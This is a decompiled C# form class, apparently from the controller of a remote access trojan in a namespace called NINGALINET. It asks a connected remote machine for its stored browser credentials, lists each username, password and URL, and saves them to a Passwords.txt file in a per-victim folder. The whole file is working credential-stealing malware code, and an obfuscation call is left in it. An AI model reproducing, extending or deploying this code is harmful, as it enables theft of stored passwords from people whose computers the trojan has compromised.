using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NINGALINET.My;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x02000026 RID: 38
	[DesignerGenerated]
	public partial class FrmStoredPassword : Form
	{
		// Token: 0x06000756 RID: 1878 RVA: 0x000045F2 File Offset: 0x000027F2
		[DebuggerNonUserCode]
		static FrmStoredPassword()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FrmStoredPassword.__ENCList = new List<WeakReference>();
		}

		// Token: 0x06000757 RID: 1879 RVA: 0x00004603 File Offset: 0x00002803
		[DebuggerNonUserCode]
		public FrmStoredPassword()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.FormClosing += new FormClosingEventHandler(this.StoredPassword_FormClosing);
			base.Load += new EventHandler(this.StoredPassword_Load);
			FrmStoredPassword.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x06000758 RID: 1880 RVA: 0x0003B2DC File Offset: 0x000394DC
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmStoredPassword.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FrmStoredPassword.__ENCList.Count == FrmStoredPassword.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FrmStoredPassword.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmStoredPassword.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FrmStoredPassword.__ENCList[num] = FrmStoredPassword.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmStoredPassword.__ENCList.RemoveRange(num, FrmStoredPassword.__ENCList.Count - num);
						FrmStoredPassword.__ENCList.Capacity = FrmStoredPassword.__ENCList.Count;
					}
					FrmStoredPassword.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x170002B1 RID: 689
		// (get) Token: 0x0600075B RID: 1883 RVA: 0x0003BC90 File Offset: 0x00039E90
		// (set) Token: 0x0600075C RID: 1884 RVA: 0x0003BCA8 File Offset: 0x00039EA8
		internal virtual LV L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L1_DoubleClick);
				if (this._L1 != null)
				{
					this._L1.DoubleClick -= value2;
				}
				this._L1 = value;
				if (this._L1 != null)
				{
					this._L1.DoubleClick += value2;
				}
			}
		}

		// Token: 0x170002B2 RID: 690
		// (get) Token: 0x0600075D RID: 1885 RVA: 0x0003BD00 File Offset: 0x00039F00
		// (set) Token: 0x0600075E RID: 1886 RVA: 0x00004642 File Offset: 0x00002842
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x170002B3 RID: 691
		// (get) Token: 0x0600075F RID: 1887 RVA: 0x0003BD18 File Offset: 0x00039F18
		// (set) Token: 0x06000760 RID: 1888 RVA: 0x0000464B File Offset: 0x0000284B
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x170002B4 RID: 692
		// (get) Token: 0x06000761 RID: 1889 RVA: 0x0003BD30 File Offset: 0x00039F30
		// (set) Token: 0x06000762 RID: 1890 RVA: 0x00004654 File Offset: 0x00002854
		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		// Token: 0x170002B5 RID: 693
		// (get) Token: 0x06000763 RID: 1891 RVA: 0x0003BD48 File Offset: 0x00039F48
		// (set) Token: 0x06000764 RID: 1892 RVA: 0x0000465D File Offset: 0x0000285D
		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		// Token: 0x170002B6 RID: 694
		// (get) Token: 0x06000765 RID: 1893 RVA: 0x0003BD60 File Offset: 0x00039F60
		// (set) Token: 0x06000766 RID: 1894 RVA: 0x00004666 File Offset: 0x00002866
		internal virtual CHProgressbar pr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._pr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._pr = value;
			}
		}

		// Token: 0x170002B7 RID: 695
		// (get) Token: 0x06000767 RID: 1895 RVA: 0x0003BD78 File Offset: 0x00039F78
		// (set) Token: 0x06000768 RID: 1896 RVA: 0x0000466F File Offset: 0x0000286F
		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		// Token: 0x170002B8 RID: 696
		// (get) Token: 0x06000769 RID: 1897 RVA: 0x0003BD90 File Offset: 0x00039F90
		// (set) Token: 0x0600076A RID: 1898 RVA: 0x00004678 File Offset: 0x00002878
		internal virtual ToolStripStatusLabel SL
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SL;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SL = value;
			}
		}

		// Token: 0x170002B9 RID: 697
		// (get) Token: 0x0600076B RID: 1899 RVA: 0x0003BDA8 File Offset: 0x00039FA8
		// (set) Token: 0x0600076C RID: 1900 RVA: 0x00004681 File Offset: 0x00002881
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x170002BA RID: 698
		// (get) Token: 0x0600076D RID: 1901 RVA: 0x0003BDC0 File Offset: 0x00039FC0
		// (set) Token: 0x0600076E RID: 1902 RVA: 0x0003BDD8 File Offset: 0x00039FD8
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				if (this._RefreshToolStripMenuItem != null)
				{
					this._RefreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				if (this._RefreshToolStripMenuItem != null)
				{
					this._RefreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002BB RID: 699
		// (get) Token: 0x0600076F RID: 1903 RVA: 0x0003BE30 File Offset: 0x0003A030
		// (set) Token: 0x06000770 RID: 1904 RVA: 0x0003BE48 File Offset: 0x0003A048
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				if (this._SaveAsToolStripMenuItem != null)
				{
					this._SaveAsToolStripMenuItem.Click -= value2;
				}
				this._SaveAsToolStripMenuItem = value;
				if (this._SaveAsToolStripMenuItem != null)
				{
					this._SaveAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002BC RID: 700
		// (get) Token: 0x06000771 RID: 1905 RVA: 0x0003BEA0 File Offset: 0x0003A0A0
		// (set) Token: 0x06000772 RID: 1906 RVA: 0x0000468A File Offset: 0x0000288A
		internal virtual ToolStripSeparator AToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._AToolStripMenuItem = value;
			}
		}

		// Token: 0x170002BD RID: 701
		// (get) Token: 0x06000773 RID: 1907 RVA: 0x0003BEB8 File Offset: 0x0003A0B8
		// (set) Token: 0x06000774 RID: 1908 RVA: 0x0003BED0 File Offset: 0x0003A0D0
		internal virtual ToolStripMenuItem CopyUsernameToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyUsernameToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyUsernameToolStripMenuItem_Click);
				if (this._CopyUsernameToolStripMenuItem != null)
				{
					this._CopyUsernameToolStripMenuItem.Click -= value2;
				}
				this._CopyUsernameToolStripMenuItem = value;
				if (this._CopyUsernameToolStripMenuItem != null)
				{
					this._CopyUsernameToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002BE RID: 702
		// (get) Token: 0x06000775 RID: 1909 RVA: 0x0003BF28 File Offset: 0x0003A128
		// (set) Token: 0x06000776 RID: 1910 RVA: 0x0003BF40 File Offset: 0x0003A140
		internal virtual ToolStripMenuItem CopyPasswordToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyPasswordToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyPasswordToolStripMenuItem_Click);
				if (this._CopyPasswordToolStripMenuItem != null)
				{
					this._CopyPasswordToolStripMenuItem.Click -= value2;
				}
				this._CopyPasswordToolStripMenuItem = value;
				if (this._CopyPasswordToolStripMenuItem != null)
				{
					this._CopyPasswordToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002BF RID: 703
		// (get) Token: 0x06000777 RID: 1911 RVA: 0x0003BF98 File Offset: 0x0003A198
		// (set) Token: 0x06000778 RID: 1912 RVA: 0x0003BFB0 File Offset: 0x0003A1B0
		internal virtual ToolStripMenuItem CopyUrlToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyUrlToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyUrlToolStripMenuItem_Click);
				if (this._CopyUrlToolStripMenuItem != null)
				{
					this._CopyUrlToolStripMenuItem.Click -= value2;
				}
				this._CopyUrlToolStripMenuItem = value;
				if (this._CopyUrlToolStripMenuItem != null)
				{
					this._CopyUrlToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002C0 RID: 704
		// (get) Token: 0x06000779 RID: 1913 RVA: 0x0003C008 File Offset: 0x0003A208
		// (set) Token: 0x0600077A RID: 1914 RVA: 0x00004693 File Offset: 0x00002893
		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		// Token: 0x0600077B RID: 1915 RVA: 0x0003C020 File Offset: 0x0003A220
		private void CopyUsernameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					MyProject.Computer.Clipboard.SetText(listViewItem.Text);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600077C RID: 1916 RVA: 0x0003C098 File Offset: 0x0003A298
		private void CopyPasswordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					MyProject.Computer.Clipboard.SetText(listViewItem.SubItems[1].Text);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600077D RID: 1917 RVA: 0x0003C11C File Offset: 0x0003A31C
		private void CopyUrlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					MyProject.Computer.Clipboard.SetText(listViewItem.SubItems[2].Text);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600077E RID: 1918 RVA: 0x0003C1A0 File Offset: 0x0003A3A0
		public string SV()
		{
			string text = "";
			try
			{
				IEnumerator enumerator = this.L1.Items.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					text = string.Concat(new string[]
					{
						text,
						"==========================================================\r\nUsername : ",
						listViewItem.Text,
						"\r\nPassword : ",
						listViewItem.SubItems[1].Text,
						"\r\nUrl : ",
						listViewItem.SubItems[2].Text,
						"\r\n==========================================================\r\n"
					});
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return text;
		}

		// Token: 0x0600077F RID: 1919 RVA: 0x0003C270 File Offset: 0x0003A470
		private void StoredPassword_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				File.WriteAllText(Conversions.ToString(Operators.AddObject(this.folder, "Passwords.txt")), this.SV());
			}
			catch (Exception expr_23)
			{
				ProjectData.SetProjectError(expr_23);
				ProjectData.ClearProjectError();
			}
			this.sk.CN = false;
		}

		// Token: 0x06000780 RID: 1920 RVA: 0x0003C2CC File Offset: 0x0003A4CC
		private void StoredPassword_Load(object sender, EventArgs e)
		{
			this.sk.Send("!");
			this.Text = Conversions.ToString(Operators.AddObject("Stored Password(s) - ", ima.vno(this.osk.L)));
			this.folder = Operators.ConcatenateObject(Operators.ConcatenateObject(this.osk.Folder, ima.vno(this.osk.L)), "\\");
			if (!Directory.Exists(Conversions.ToString(this.folder)))
			{
				Directory.CreateDirectory(Conversions.ToString(this.folder));
			}
			this.L1.FX();
		}

		// Token: 0x06000781 RID: 1921 RVA: 0x0003C370 File Offset: 0x0003A570
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog
			{
				Filter = "TXT|*.txt",
				FileName = "Passwords.txt"
			};
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				try
				{
					File.WriteAllText(saveFileDialog.FileName, this.SV());
					ima.F.sl.Text = Conversions.ToString(Operators.AddObject(Operators.AddObject("Save password(s) ", ima.vno(this.osk.L)), " succeeded.."));
				}
				catch (Exception expr_78)
				{
					ProjectData.SetProjectError(expr_78);
					ima.F.sl.Text = Conversions.ToString(Operators.AddObject(Operators.AddObject("Save password(s) ", ima.vno(this.osk.L)), " error.."));
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x06000782 RID: 1922 RVA: 0x0000469C File Offset: 0x0000289C
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.sk.Send("!");
		}

		// Token: 0x06000783 RID: 1923 RVA: 0x0003C44C File Offset: 0x0003A64C
		private void L1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				string text = this.L1.SelectedItems[0].SubItems[2].Text;
				if (!text.Contains("://"))
				{
					text = "http://" + text;
				}
				Process.Start(text);
			}
			catch (Exception expr_48)
			{
				ProjectData.SetProjectError(expr_48);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x04000367 RID: 871
		private static List<WeakReference> __ENCList;

		// Token: 0x04000369 RID: 873
		[AccessedThroughProperty("L1")]
		private LV _L1;

		// Token: 0x0400036A RID: 874
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x0400036B RID: 875
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x0400036C RID: 876
		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		// Token: 0x0400036D RID: 877
		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		// Token: 0x0400036E RID: 878
		[AccessedThroughProperty("pr")]
		private CHProgressbar _pr;

		// Token: 0x0400036F RID: 879
		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		// Token: 0x04000370 RID: 880
		[AccessedThroughProperty("SL")]
		private ToolStripStatusLabel _SL;

		// Token: 0x04000371 RID: 881
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x04000372 RID: 882
		[AccessedThroughProperty("RefreshToolStripMenuItem")]
		private ToolStripMenuItem _RefreshToolStripMenuItem;

		// Token: 0x04000373 RID: 883
		[AccessedThroughProperty("SaveAsToolStripMenuItem")]
		private ToolStripMenuItem _SaveAsToolStripMenuItem;

		// Token: 0x04000374 RID: 884
		[AccessedThroughProperty("AToolStripMenuItem")]
		private ToolStripSeparator _AToolStripMenuItem;

		// Token: 0x04000375 RID: 885
		[AccessedThroughProperty("CopyUsernameToolStripMenuItem")]
		private ToolStripMenuItem _CopyUsernameToolStripMenuItem;

		// Token: 0x04000376 RID: 886
		[AccessedThroughProperty("CopyPasswordToolStripMenuItem")]
		private ToolStripMenuItem _CopyPasswordToolStripMenuItem;

		// Token: 0x04000377 RID: 887
		[AccessedThroughProperty("CopyUrlToolStripMenuItem")]
		private ToolStripMenuItem _CopyUrlToolStripMenuItem;

		// Token: 0x04000378 RID: 888
		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		// Token: 0x04000379 RID: 889
		public Client sk;

		// Token: 0x0400037A RID: 890
		public Client osk;

		// Token: 0x0400037B RID: 891
		public object folder;
	}
}
